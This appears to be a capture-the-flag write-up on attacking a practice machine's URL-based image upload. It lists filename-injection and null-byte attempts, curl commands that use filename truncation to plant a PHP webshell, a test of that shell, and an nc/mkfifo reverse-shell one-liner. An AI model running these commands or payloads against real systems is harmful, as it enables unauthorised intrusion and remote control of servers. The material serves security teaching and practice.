@@ -1,1 +1,59 @@
+Know Your Limits
+File name truncation
+File Upload Overview / Failures
+The admin user has access to additional functionality, /upload.php. The /upload.php path takes a url for an image.
+
+upload
+If you try to upload something ending in a non-image extension, you get:
+Fails:
+    http://10.10.15.99:8081/cmd.php'; echo png # - error, no upload
+    http://10.10.15.99:8081/cmd.php';test.png - full string at http server
+    http://10.10.15.99:8081/cmd.php;.jpg - gets file, but only full path is accessible
+    http://10.10.15.99:8081/cmd.php%00.jpg - GET request makes it to server, but error there
+    Extension filter not done client side - catching request and modifying doesn’t bypass
+    http://10.10.15.99:8081/cmd.php%27%3b%20echo%20test%23.png - request for full url
+    http://10.10.15.99:8081/cmd.php #.png- invalid url
+    http://10.10.10.15.99:8081/cmd.php%27%3btest.png - http server gets encoded chars in request
+
+File Upload Success - File name truncation
+The admin’s profile page has a quote, which is actually a hint:
+“Know  your limits”
+As far as limits, when submitting an absurdly long name into the system, the message is a bit different:
+1526400260532
+
+So what is the longest acceptable length?
+root@kali# URL=$(python -c 'print "http://10.10.15.99:8081/" + "A"*228 + "test.png"'); curl -i -s -k  -X $'POST'     -H $'Referer: http://10.10.10.73/upload.php' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Cookie: PHPSESSID=g9kp8du6ofpc7g8m5d81nt2c00'     --data-binary "url=$URL" $'http://10.10.10.73/upload.php' | grep "The name is too long"
+
+root@kali# URL=$(python -c 'print "http://10.10.15.99:8081/" + "A"*229 + "test.png"'); curl -i -s -k  -X $'POST'     -H $'Referer: http://10.10.10.73/upload.php' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Cookie: PHPSESSID=g9kp8du6ofpc7g8m5d81nt2c00'     --data-binary "url=$URL" $'http://10.10.10.73/upload.php' | grep "The name is too long"
+        <pre>The name is too long, 237 chars total.
+
+At 237 characters, the full file is still requested at http server:
+10.10.10.73 - - [15/May/2018 12:22:50] code 404, message File not found
+10.10.10.73 - - [15/May/2018 12:22:50] "GET /AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAtest.png HTTP/1.1" 404 -
+
+Looking in more detail at the output from 237 character file name:
+
+root@kali# URL=$(python -c 'print "http://10.10.15.99:8081/" + "A"*229 + "test.png"'); curl -i -s -k  -X $'POST'     -H $'Referer: http://10.10.10.73/upload.php' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Cookie: PHPSESSID=g9kp8du6ofpc7g8m5d81nt2c00'     --data-binary "url=$URL" $'http://10.10.10.73/upload.php' | grep -e "The name is too long" -e shorten -e "New name"
+        <pre>The name is too long, 237 chars total.
+Trying to shorten...
+New name is AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAtest.pn.
+
+The new name is no longer a png file.
+
+So upload a php webshell that ends in .php.png that is just long enough that the last four characters get truncated:
+
+root@kali# URL=$(python -c 'print "http://10.10.15.99:8081/" + "A"*232 + ".php.png"'); curl -i -s -k  -X $'POST'     -H $'Referer: http://10.10.10.73/upload.php' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Cookie: PHPSESSID=g9kp8du6ofpc7g8m5d81nt2c00'     --data-binary "url=$URL" $'http://10.10.10.73/upload.php' | grep -e "The name is too long" -e shorten -e "New name" -e CMD
+        <pre>CMD: cd /var/www/html/uploads/0515-1930_45ed3e0a6a8c22db; wget 'http://10.10.15.99:8081/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.png'</pre>
+        <pre>The name is too long, 240 chars total.
+Trying to shorten...
+New name is AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.
+
+Test the shell:
+
+root@kali# curl http://10.10.10.73/uploads/0515-1930_45ed3e0a6a8c22db/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php?cmd=id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+Webshell –> Shell
+
+I was able to get an interactive shell on Falafel using the nc / pipe backdoor, rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {} {} >/tmp/f. As I like to script these things, I write a python script to generate a callback, which is included at the end of this post.
 
